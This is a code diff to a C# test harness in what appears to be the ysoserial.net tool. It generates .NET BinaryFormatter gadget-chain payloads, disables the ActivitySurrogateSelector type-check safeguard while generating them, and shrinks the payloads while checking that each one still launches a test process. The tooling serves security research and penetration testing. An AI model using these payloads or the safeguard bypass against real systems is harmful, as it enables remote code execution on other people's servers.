@@ -5,11 +5,13 @@ using System.Text;
 using System.Threading.Tasks;
 using NDesk.Options;
 using ysoserial.Generators;
-using ysoserial.Helpers.ModifiedVulnerableBinaryFormatters;
 using System.IO;
 using System.Diagnostics;
 using Newtonsoft.Json.Linq;
 using System.Text.RegularExpressions;
+using ysoserial.Helpers.ModifiedVulnerableBinaryFormatters;
+using System.Web.UI.WebControls;
+using System.Configuration;
 
 namespace ysoserial.Helpers.TestingArena
 {
@@ -34,797 +36,86 @@ namespace ysoserial.Helpers.TestingArena
         public void Start(InputArgs inputArgs)
         {
             this.inputArgs = inputArgs;
-            //ManualTCDGPayload4Minifying();
             //MinimiseTCDJsonAndRun();
+            //ManualTCDGPayload4Minifying();
+            //TextFormatterMinifying();
+            //ActivitySurrogateSelector();
             Console.ReadLine();
+        }
+
+        private void ActivitySurrogateSelector()
+        {
+            string myApp = "TestConsoleApp_YSONET";
+            sampleInputArgs = new InputArgs(myApp + " /foo bar", true, true, true, true, true, null);
+            bool isErrOk = false;
+
+            PayloadClass myPayloadClass = new PayloadClass(1, sampleInputArgs);
+
+            List<object> ls = myPayloadClass.GadgetChains();
+            //*
+            // Disable ActivitySurrogate type protections during generation
+            ConfigurationManager.AppSettings.Set("microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck", "true");
+
+            //Serialize(myPayloadClass, "BinaryFormatter", sampleInputArgs);
+            MemoryStream lsMs = new MemoryStream();
+
+            System.Runtime.Serialization.Formatters.Binary.BinaryFormatter fmt = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
+            fmt.SurrogateSelector = new MySurrogateSelector();
+            fmt.Serialize(lsMs, ls);
+            //lsMs.Position = 0;
+            //fmt.Deserialize(lsMs);
+            
+            byte[] bf_byte = lsMs.ToArray();
+            Console.WriteLine("Init size: " + bf_byte.Length);
+            string json_string = AdvancedBinaryFormatterParser.StreamToJson(new MemoryStream(bf_byte), false, true, true);
+
+            //MemoryStream msCanIt = AdvancedBinaryFormatterParser.JsonToStream(json_string);
+            //msCanIt.Position = 0;
+            //fmt.Deserialize(msCanIt);
+
+            string result = BinaryFormatterMinifier.MinimiseJsonAndRun(json_string, sampleInputArgs, isErrOk, true);
+
+            Console.WriteLine(result);
+            MemoryStream ms = AdvancedBinaryFormatterParser.JsonToStream(result);
+            Console.WriteLine("Final size: " + ms.Length);
+            Console.ReadLine();
+
+        }
+
+        private void TextFormatterMinifying()
+        {
+            string myApp = "TestConsoleApp_YSONET";
+            sampleInputArgs = new InputArgs(myApp + " /foo bar", true, false, true, true, true, null);
+            bool isErrOk = false;
+
+            TextFormattingRunPropertiesGenerator generator = new TextFormattingRunPropertiesGenerator();
+            byte[] tcd_bf_byte = (byte[])generator.GenerateWithNoTest("binaryformatter", sampleInputArgs);
+            Console.WriteLine("Init size: " + tcd_bf_byte.Length);
+            string json_string = AdvancedBinaryFormatterParser.StreamToJson(new MemoryStream(tcd_bf_byte), false, true, true);
+
+            string result = BinaryFormatterMinifier.MinimiseJsonAndRun(json_string, sampleInputArgs, isErrOk, true);
+            Console.WriteLine(result);
+            MemoryStream ms = AdvancedBinaryFormatterParser.JsonToStream(result);
+            Console.WriteLine("Final size: " + ms.Length);
+            Console.ReadLine();
+
         }
 
         // this has been used as an example to minify the TypeConfuseDelegateGenerator payload!
         private void MinimiseTCDJsonAndRun()
         {
-            string myApp = "TestConsoleApp";
+            string myApp = "TestConsoleApp_YSONET";
             sampleInputArgs = new InputArgs(myApp + " /foo bar", true, false, false, false, true, null);
             bool isErrOk = false;
             
             TypeConfuseDelegateGenerator tcdg = new TypeConfuseDelegateGenerator();
             byte[] tcd_bf_byte = (byte[])tcdg.GenerateWithNoTest("binaryformatter", sampleInputArgs);
             string json_string = AdvancedBinaryFormatterParser.StreamToJson(new MemoryStream(tcd_bf_byte), false, true, true);
-            
-            string oldJson_string = json_string;
-            string result = "";
-            int counter = 1;
-            while (result != oldJson_string)
-            {
-                Console.WriteLine("=====> running counter: " + counter++);
-                if (result != "")
-                    oldJson_string = result;
-                result = MinimiseJsonAndRun(oldJson_string, sampleInputArgs, isErrOk);
-                Console.WriteLine("\r\n\r\n");
-            }
 
-            // removing spaces between array items
-            result = Regex.Replace(result, @"\:\s*\[[a-z\sA-Z0-9\,\[\]""'\+\._`]+\],", delegate (Match m)
-            {
-                String finalVal = m.Value;
-                finalVal = Regex.Replace(finalVal, @"\s+", "");
-                return finalVal;
-            });
+            byte[] result = BinaryFormatterMinifier.MinimiseBFAndRun(tcd_bf_byte, sampleInputArgs, isErrOk, true);
 
-            // removing spaces between non-alphanumerical characters at the beginning of each clause
-            result = Regex.Replace(result, @"^\s*([^\w""':. ][^\w""']+)+", delegate (Match m)
-            {
-                String finalVal = m.Value;
-                finalVal = Regex.Replace(finalVal, @"\s+", "");
-                return finalVal;
-            }, RegexOptions.Multiline);
-
-            Console.WriteLine(result);
+            Console.WriteLine(Encoding.UTF8.GetString(result));
             Console.ReadLine();
-        }
-
-        private string MinimiseJsonAndRun(string json_string, InputArgs inInputArgs, bool isErrOk)
-        {
-            string myApp = inInputArgs.CmdFileName;
-
-            JArray jsonJArrayObj = JArray.Parse(json_string);
-
-            if (!BinaryFormatterDeserializeABFJson(json_string))
-            {
-                isErrOk = true;
-            }
-
-            if (KillMyProcess(myApp))
-            {
-                // rules:
-                // remove a Data object
-                // replace a string with null
-                // replace a non empty string with an empty string ('')
-                // replace a non empty string greater than one character with one character ('x')
-                // replace space in string if it contains a space
-                // replace a full class or assembly string to only keep class - then class and assembly
-                // replace an integer with 0 to N - when int is M and N < M && N < 20 (we need a limit)
-
-                StringBuilder sbSuccessResult = new StringBuilder();
-
-                List<String> valueExclusionList = new List<string> { inInputArgs.CmdFullString, inInputArgs.CmdFileName, inInputArgs.CmdArguments, inInputArgs.CmdFromFile };
-                List<String> typeExclusionList = new List<string> { "SerializationHeaderRecord", "MessageEnd" };
-                List<String> nameExclusionList = new List<string> { "$type", "objectId" };
-
-                sbSuccessResult.Append(DataObjectRemovalTester(ref jsonJArrayObj, myApp, isErrOk));
-
-                sbSuccessResult.Append(DataObjectNullifyTester(ref jsonJArrayObj, myApp, isErrOk, valueExclusionList));
-                
-                // TODO: do we need to repeat object removal? and all this? if yes, can we do it recursively by just calling this funcion?
-
-                // replace a string with null
-                // replace a non empty string with an empty string ('')
-                // replace a non empty string greater than one character with one character ('x')
-                // replace space in string if it contains a space
-                // replace a full class or assembly string to only keep class - then class and assembly
-                // replace an integer with 0 to N - when int is M and N < M && N < 20 (we need a limit)
-                
-                JArray origJsonJArrayObj = new JArray(jsonJArrayObj.ToList().ToArray());
-                bool ruleComplete = false;
-                while (!ruleComplete)
-                {
-                    int internalCounter = 0;
-
-                    foreach (JObject item in jsonJArrayObj)
-                    {
-                        internalCounter++;
-                        JToken dataItem = item["Data"];
-                        foreach (JProperty subDataItem in dataItem)
-                        {
-                            string subDataItemName = subDataItem.Name;
-                            JToken subDataItemValue = subDataItem.Value;
-                            JTokenType subDataItemType = subDataItem.Value.Type;
-
-                            if (subDataItemName.Equals("$type"))
-                            {
-                                if (subDataItemValue.ToString().Equals("MessageEnd"))
-                                {
-                                    ruleComplete = true;
-                                    break;
-                                }
-
-                                if (typeExclusionList.Contains(subDataItemValue.ToString()))
-                                {
-                                    break;
-                                }
-                            }
-
-                            string subDataItemValueStringValue = "";
-
-                            if (item["Data"]["value"] != null)
-                            {
-                                subDataItemValueStringValue = (string) item["Data"]["value"];
-                            }
-
-                            if (nameExclusionList.Contains(subDataItemName) || valueExclusionList.Contains(subDataItemValueStringValue))
-                                continue;
-
-                            switch (subDataItemType)
-                            {
-                                case JTokenType.String:
-                                case JTokenType.Integer:
-                                    sbSuccessResult.Append(RulesRunner(ref jsonJArrayObj, subDataItem, myApp, isErrOk));
-                                    break;
-                                case JTokenType.Null:
-                                    // do nothing!
-                                    break;
-                                case JTokenType.Array:
-                                    // we will have string, int, and null again (never another Array in this case) -> we care about int and string
-
-                                    // check if the whole array can be replaced with null
-                                    sbSuccessResult.Append(RulesRunner(ref jsonJArrayObj, subDataItem, -1, myApp, isErrOk));
-
-                                    if (subDataItem.Value != null)
-                                    {
-                                        // this is when it could not be null by the previous rule
-
-                                        // first we need to remove items within the array to see which one can be safely removed
-
-
-                                        int externalArrayCounter = 0;
-                                        while (externalArrayCounter < subDataItem.Value.ToList().Count)
-                                        {
-                                            var origArrayList = subDataItem.Value.ToList();
-                                            var newArrayList = subDataItem.Value.ToList();
-
-                                            if (!valueExclusionList.Contains(newArrayList[externalArrayCounter].ToString()))
-                                            {
-                                                newArrayList.RemoveAt(externalArrayCounter);
-                                                subDataItem.Value = new JArray(newArrayList);
-
-                                                if (CheckIfSuccess(jsonJArrayObj.ToString(), myApp, isErrOk))
-                                                {
-                                                    // it is a success so we can remove it!
-                                                    externalArrayCounter--;
-                                                    sbSuccessResult.AppendLine("Successful in removing:" + newArrayList + " - item: " + externalArrayCounter);
-                                                }
-                                                else
-                                                {
-                                                    //undo
-                                                    subDataItem.Value = new JArray(origArrayList);
-                                                }
-                                            }
-                                            externalArrayCounter++;
-                                        }
-
-                                        int counter = 0;
-                                        foreach (JToken subArrayItem in subDataItem.Value.ToList())
-                                        {
-                                            JToken arrayItemValue = subArrayItem;
-                                            JTokenType arrayItemType = subArrayItem.Type;
-
-                                            if (valueExclusionList.Contains(arrayItemValue.ToString()))
-                                                continue;
-
-                                            switch (arrayItemType)
-                                            {
-                                                case JTokenType.String:
-                                                case JTokenType.Integer:
-                                                    sbSuccessResult.Append(RulesRunner(ref jsonJArrayObj, subDataItem, counter, myApp, isErrOk));
-                                                    break;
-                                                default:
-                                                    break;
-                                            }
-                                            counter++;
-                                        }
-
-                                    }
-
-                                    break;
-                                default:
-                                    RulesRunner(ref jsonJArrayObj, subDataItem, myApp, isErrOk);
-                                    break;
-                            }
-                        }
-
-                        if (ruleComplete)
-                            break;
-                    }
-                }
-
-
-                //*                
-                Console.WriteLine(sbSuccessResult);
-                //*/
-
-                /*
-                var resultString = jsonJArrayObj.ToString();
-                Console.WriteLine(resultString);
-                */
-
-            }
-            else
-            {
-                Console.WriteLine("Ivalid test case!");
-            }
-
-            return jsonJArrayObj.ToString();
-        }
-
-        private StringBuilder DataObjectRemovalTester(ref JArray jsonJArrayObj, string myApp, bool isErrOk)
-        {
-            JArray origJsonJArrayObj = new JArray(jsonJArrayObj.ToList().ToArray());
-            string json_shortened = origJsonJArrayObj.ToString();
-            bool ruleComplete = false;
-
-            StringBuilder sbSuccessResult = new StringBuilder();
-            
-            // remove a Data object
-            ruleComplete = false;
-            int externalCounter = 0;
-            while (!ruleComplete)
-            {
-                int internalCounter = 0;
-
-                foreach (JObject item in origJsonJArrayObj)
-                {
-                    internalCounter++;
-                    JToken dataItem = item["Data"];
-                    foreach (JProperty subDataItem in dataItem)
-                    {
-                        string subDataItemName = subDataItem.Name;
-                        JToken subDataItemValue = subDataItem.Value;
-                        JTokenType subDataItemType = subDataItem.Value.Type;
-                        if (subDataItemName.Equals("$type"))
-                        {
-                            if (subDataItemValue.ToString().Equals("MessageEnd"))
-                            {
-                                ruleComplete = true;
-                            }
-                            break;
-                        }
-                    }
-
-                    if (!ruleComplete && internalCounter > externalCounter)
-                    {
-                        var currentObjId = item["Data"]["objectId"];
-                        
-                        string tempValue = item.ToString();
-                        item.Remove();
-
-                        if (currentObjId != null)
-                        {
-                            // we want to remove objects that have idRef == objectId of our removed item
-                            List<JObject> refRremovalList = new List<JObject>();
-                            foreach (JObject otherItems in origJsonJArrayObj)
-                            {
-                                if (otherItems["Data"]["idRef"] != null)
-                                {
-                                    if ((int) otherItems["Data"]["idRef"] == (int) currentObjId)
-                                    {
-                                        refRremovalList.Add(otherItems);
-                                    }
-                                }
-                            }
-
-                            foreach (JObject refObject in refRremovalList)
-                            {
-                                refObject.Remove();
-                            }
-                        }
-
-                        if (CheckIfSuccess(origJsonJArrayObj.ToString(), myApp, isErrOk))
-                        {
-                            // it is a success so we can remove it!
-                            // we have to start from the beginning!
-                            externalCounter = 0;
-                            jsonJArrayObj = new JArray(origJsonJArrayObj.ToList().ToArray());
-                            sbSuccessResult.AppendLine("Successful in removing:" + tempValue);
-                        }
-                        else
-                        {
-                            // we should not remove it
-                            externalCounter = internalCounter;
-                            origJsonJArrayObj = new JArray(jsonJArrayObj.ToList().ToArray());
-                        }
-
-                        break;
-                    }
-                }
-            }
-
-
-            return sbSuccessResult;
-        }
-
-        private StringBuilder DataObjectNullifyTester(ref JArray jsonJArrayObj, string myApp, bool isErrOk, List<String> valueExclusionList)
-        {
-            
-            JArray origJsonJArrayObj = new JArray(jsonJArrayObj.ToList().ToArray());
-            string json_shortened = origJsonJArrayObj.ToString();
-            bool ruleComplete = false;
-
-            StringBuilder sbSuccessResult = new StringBuilder();
-
-            JObject nullJObject = JObject.Parse(@"{'Id': 0,
-    'TypeName': 'ObjectNull',
-    'Data': {
-      '$type': 'ObjectNull',
-      'nullCount': 0
-}}");
-            // remove a Data object
-            ruleComplete = false;
-            int externalCounter = 0;
-            while (!ruleComplete)
-            {
-                int internalCounter = 0;
-
-                foreach (JObject item in origJsonJArrayObj)
-                {
-                    internalCounter++;
-                    bool isExcluded = false;
-                    JToken dataItem = item["Data"];
-                    foreach (JProperty subDataItem in dataItem)
-                    {
-                        string subDataItemName = subDataItem.Name;
-                        JToken subDataItemValue = subDataItem.Value;
-                        JTokenType subDataItemType = subDataItem.Value.Type;
-                        if (subDataItemName.Equals("$type"))
-                        {
-                            if (subDataItemValue.ToString().Equals("MessageEnd"))
-                            {
-                                ruleComplete = true;
-                            }
-                            else if (subDataItemValue.ToString().Equals("ObjectNull"))
-                            {
-                                isExcluded = true;
-                            }
-                            break;
-                        }
-                    }
-
-                    string subDataItemValueStringValue = "";
-
-                    if (item["Data"]["value"] != null)
-                    {
-                        subDataItemValueStringValue = (string)item["Data"]["value"];
-                    }
-
-                    if (isExcluded || valueExclusionList.Contains(subDataItemValueStringValue))
-                        continue;
-
-                    if (!ruleComplete && internalCounter > externalCounter)
-                    {
-                        var currentObjId = item["Data"]["objectId"];
-
-                        string tempValue = item.ToString();
-                        item.AddAfterSelf(nullJObject);
-                        item.Remove();
-
-                        if (currentObjId != null)
-                        {
-                            // we want to remove objects that have idRef == objectId of our removed item
-                            List<JObject> refRremovalList = new List<JObject>();
-                            foreach (JObject otherItems in origJsonJArrayObj)
-                            {
-                                if (otherItems["Data"]["idRef"] != null)
-                                {
-                                    if ((int)otherItems["Data"]["idRef"] == (int)currentObjId)
-                                    {
-                                        refRremovalList.Add(otherItems);
-                                    }
-                                }
-                            }
-
-                            foreach (JObject refObject in refRremovalList)
-                            {
-                                refObject.AddAfterSelf(nullJObject);
-                                refObject.Remove();
-                            }
-                        }
-
-                        if (CheckIfSuccess(origJsonJArrayObj.ToString(), myApp, isErrOk))
-                        {
-                            // it is a success so we can remove it!
-                            // we have to start from the beginning!
-                            externalCounter = 0;
-                            jsonJArrayObj = new JArray(origJsonJArrayObj.ToList().ToArray());
-                            sbSuccessResult.AppendLine("Successful in nullifying:" + tempValue);
-                        }
-                        else
-                        {
-                            // we should not remove it
-                            externalCounter = internalCounter;
-                            origJsonJArrayObj = new JArray(jsonJArrayObj.ToList().ToArray());
-                        }
-
-                        break;
-                    }
-                }
-            }
-
-
-            return sbSuccessResult;
-        }
-
-        private StringBuilder RulesRunner(ref JArray jsonJArrayObj, JProperty currentPropItem, string myApp, bool isErrOk)
-        {
-            return RulesRunner(ref jsonJArrayObj, currentPropItem, -1, myApp, isErrOk);
-        }
-
-        private StringBuilder RulesRunner(ref JArray jsonJArrayObj, JProperty currentPropItem, int arrNum, string myApp, bool isErrOk)
-        {
-            StringBuilder sbSuccessResult = new StringBuilder();
-            var origCurrentItem = currentPropItem.Value.DeepClone();
-            JTokenType currentItemType = currentPropItem.Value.Type;
-
-            if (currentItemType == JTokenType.Array)
-            {
-                if ((arrNum) > -1)
-                {
-                    // we are dealing with an array item
-                    currentItemType = currentPropItem.Value[arrNum].Type;
-                }
-            }
-
-            switch (currentItemType)
-            {
-                case JTokenType.String:
-                    string origValue = currentPropItem.Value.ToString();
-
-                    if (arrNum > -1)
-                    {
-                        origValue = currentPropItem.Value[arrNum].ToString();
-                    }
-
-                    // replace a string with null
-                    if (arrNum == -1)
-                    {
-                        currentPropItem.Value = null;
-                    }
-                    else
-                    {
-                        currentPropItem.Value[arrNum] = null;
-                    }
-
-                    if (CheckIfSuccess(jsonJArrayObj.ToString(), myApp, isErrOk))
-                    {
-                        //success
-                        sbSuccessResult.AppendLine("String replaced with null: " + origValue);
-                        break;
-                    }
-
-                    // undo
-                    currentPropItem.Value = origCurrentItem.DeepClone();
-
-                    if (!string.IsNullOrEmpty(origValue))
-                    {
-                        // replace a non empty string with an empty string ('')
-                        if (arrNum == -1)
-                        {
-                            currentPropItem.Value = "";
-                        }
-                        else
-                        {
-                            currentPropItem.Value[arrNum] = "";
-                        }
-
-
-                        if (CheckIfSuccess(jsonJArrayObj.ToString(), myApp, isErrOk))
-                        {
-                            //success
-                            sbSuccessResult.AppendLine("String replaced with empty: " + origValue);
-                            break;
-                        }
-
-                        // undo
-                        currentPropItem.Value = origCurrentItem.DeepClone();
-
-                        if (origValue.Length > 1)
-                        {
-                            // replace a non empty string greater than one character with one character ('x')
-                            if (arrNum == -1)
-                            {
-                                currentPropItem.Value = "x";
-                            }
-                            else
-                            {
-                                currentPropItem.Value[arrNum] = "x";
-                            }
-
-                            if (CheckIfSuccess(jsonJArrayObj.ToString(), myApp, isErrOk))
-                            {
-                                //success
-                                sbSuccessResult.AppendLine("String replaced with 'x': " + origValue);
-                                break;
-                            }
-
-                            // undo
-                            currentPropItem.Value = origCurrentItem.DeepClone();
-
-                            if (origValue.Contains(" "))
-                            {
-                                // replace space in string if it contains a space    
-                                if (arrNum == -1)
-                                {
-                                    currentPropItem.Value = origValue.Replace(" ", "");
-                                }
-                                else
-                                {
-                                    currentPropItem.Value[arrNum] = origValue.Replace(" ", "");
-                                }
-
-                                if (CheckIfSuccess(jsonJArrayObj.ToString(), myApp, isErrOk))
-                                {
-                                    //success
-                                    origValue = currentPropItem.Value.ToString();
-
-                                    if (arrNum > -1)
-                                    {
-                                        origValue = currentPropItem.Value[arrNum].ToString();
-                                    }
-                                    sbSuccessResult.AppendLine("Space characters removed from: " + origValue);
-                                    // we shouldn't break here! we have things to do!
-                                }
-                                else
-                                {
-                                    // undo
-                                    currentPropItem.Value = origCurrentItem.DeepClone();
-                                }
-                            }
-
-                            origCurrentItem = currentPropItem.Value.DeepClone();
-
-                            string newValue = origValue;
-
-                            // replace a full class or assembly string to only keep then class and assembly
-                            Regex asmSection = new Regex(@"([^,]+)\s*[,]\s*Version=[^,]+,\s*Culture=[^,]+,\s*PublicKeyToken=[a-z0-9]{16}", RegexOptions.IgnoreCase);
-
-                            foreach (Match match in asmSection.Matches(origValue))
-                            {
-                                if (arrNum == -1)
-                                {
-                                    currentPropItem.Value = newValue.Replace(match.Value, match.Groups[1].Value);
-                                }
-                                else
-                                {
-                                    currentPropItem.Value[arrNum] = newValue.Replace(match.Value, match.Groups[1].Value);
-                                }
-
-                                if (CheckIfSuccess(jsonJArrayObj.ToString(), myApp, isErrOk))
-                                {
-                                    // success
-                                    newValue = currentPropItem.Value.ToString();
-                                    if (arrNum > -1)
-                                    {
-                                        newValue = currentPropItem.Value[arrNum].ToString();
-                                    }
-                                    sbSuccessResult.AppendLine("A class or an assembly string became shorter: " + origValue);
-                                    origCurrentItem = currentPropItem.Value.DeepClone();
-                                }
-                            }
-
-                            // undo
-                            if (newValue.Equals(origValue))
-                            {
-                                // failure
-                                currentPropItem.Value = origCurrentItem.DeepClone();
-                            }
-                            else
-                            {
-                                origValue = newValue;
-                            }
-
-                            origCurrentItem = currentPropItem.Value.DeepClone();
-
-                            // replace a full class or assembly string to only keep class
-                            Regex classRegex = new Regex(@"([a-z0-9\.\+_\$`]+)\s*[;,]\s*[a-z0-9\.\+_\$`]+", RegexOptions.IgnoreCase);
-
-                            newValue = origValue;
-
-                            foreach (Match match in classRegex.Matches(origValue))
-                            {
-                                if (arrNum == -1)
-                                {
-                                    currentPropItem.Value = newValue.Replace(match.Value, match.Groups[1].Value);
-                                }
-                                else
-                                {
-                                    currentPropItem.Value[arrNum] = newValue.Replace(match.Value, match.Groups[1].Value);
-                                }
-
-                                if (CheckIfSuccess(jsonJArrayObj.ToString(), myApp, isErrOk))
-                                {
-                                    // success
-                                    newValue = currentPropItem.Value.ToString();
-                                    if (arrNum > -1)
-                                    {
-                                        newValue = currentPropItem.Value[arrNum].ToString();
-                                    }
-                                    sbSuccessResult.AppendLine("A class or an assembly string became shorter: " + origValue);
-                                    origCurrentItem = currentPropItem.Value.DeepClone();
-                                }
-                            }
-
-                            // undo if failed
-                            if (arrNum == -1 && !newValue.Equals(currentPropItem.Value.ToString()))
-                            {
-                                currentPropItem.Value = origCurrentItem.DeepClone();
-                            }
-                            else if (arrNum > -1 && !newValue.Equals(currentPropItem.Value[arrNum].ToString()))
-                            {
-                                currentPropItem.Value = origCurrentItem.DeepClone();
-                            }
-
-                        }
-                    }
-
-                    break;
-                case JTokenType.Integer:
-                    // replace an integer with 0 to N - when int is M and N < M && N < 20 (we need a limit)
-                    var origItemValue = currentPropItem.Value.DeepClone();
-                    int origIntValue = 0;
-
-                    if (arrNum == -1)
-                    {
-                        int.TryParse(currentPropItem.Value.ToString(), out origIntValue);
-                    }
-                    else
-                    {
-                        int.TryParse(currentPropItem.Value[arrNum].ToString(), out origIntValue);
-                    }
-
-
-                    if (origIntValue > 0)
-                    {
-                        int intCounter = 0;
-
-                        while (intCounter < origIntValue && intCounter < 20)
-                        {
-
-                            if (arrNum == -1)
-                            {
-                                currentPropItem.Value = intCounter;
-                            }
-                            else
-                            {
-                                currentPropItem.Value[arrNum] = intCounter;
-                            }
-
-                            if (CheckIfSuccess(jsonJArrayObj.ToString(), myApp, isErrOk))
-                            {
-                                //success
-                                sbSuccessResult.AppendLine("A number was changed from: " + origIntValue + " to: " + intCounter);
-                                break;
-                            }
-                            else
-                            {
-                                currentPropItem.Value = origItemValue.DeepClone();
-                            }
-
-                            intCounter++;
-                        }
-                    }
-                    break;
-                default:
-                    // convert to null
-                    currentPropItem.Value = null;
-                    if (CheckIfSuccess(jsonJArrayObj.ToString(), myApp, isErrOk))
-                    {
-                        //success
-                        sbSuccessResult.AppendLine("An item was replaced with null: " + origCurrentItem.ToString());
-                        break;
-                    }
-                    // undo
-                    currentPropItem.Value = origCurrentItem.DeepClone();
-                    break;
-            }
-
-            return sbSuccessResult;
-        }
-
-        private bool CheckIfSuccess(string strJson, string myApp, bool isErrOk)
-        {
-            bool result = true;
-
-            try
-            {
-                if (!BinaryFormatterDeserializeABFJson(strJson))
-                {
-                    if (!isErrOk)
-                    {
-                        // we have error but we don't like errors
-                        result = false;
-                    }
-                }
-            }
-            catch
-            {
-                if (!isErrOk)
-                {
-                    // we have error but we don't like errors
-                    result = false;
-                }
-            }
-
-
-            if (!KillMyProcess(myApp))
-            {
-                // no app was found so the code exec did not work
-                result = false;
-            }
-
-            return result;
-        }
-
-        private bool BinaryFormatterDeserializeABFJson(string strJson)
-        {
-            bool noError = true;
-            try
-            {
-                MemoryStream ms = AdvancedBinaryFormatterParser.JsonToStream(strJson);
-
-                /*
-                ms.Position = 0;
-                BinaryFormatter bf = new BinaryFormatter();
-                var task = Task.Run(() => bf.Deserialize(ms));              
-                //*/
-
-                var task = Task.Run(() => { try { SerializersHelper.BinaryFormatter_deserialize(ms.ToArray()); } catch { noError = false; } });
-
-                if (!task.Wait(TimeSpan.FromSeconds(5)))
-                {
-                    noError = false;
-                    Console.WriteLine("The formatter is not responding - infinite loop because of parameters.");
-                }
-
-
-
-            }
-            catch
-            {
-                noError = false;
-            }
-
-            return noError;
-        }
-
-        private bool KillMyProcess(string myprocess)
-        {
-            bool processFound = false;
-            foreach (Process myp in Process.GetProcessesByName(myprocess))
-            {
-                // It has worked
-                processFound = true;
-                // killing any existing TestConsoleApp to be ready
-                try
-                {
-                    myp.Kill();
-                }
-                catch
-                {
-                    // hopefully it is just a race condition and all has been closed!!!
-                    // just to be on the safe side:
-                    KillMyProcess(myprocess);
-                }
-
-            }
-
-            return processFound;
         }
 
         private void ManualTCDGPayload4Minifying()
@@ -941,7 +232,7 @@ namespace ysoserial.Helpers.TestingArena
     'Data': {
       '$type': 'BinaryObjectString',
       'objectId': 7,
-      'value': 'TestConsoleApp'
+      'value': 'TestConsoleApp_YSONET'
 }},{'Id': 13,
     'TypeName': 'ObjectWithMapTyped',
     'Data': {
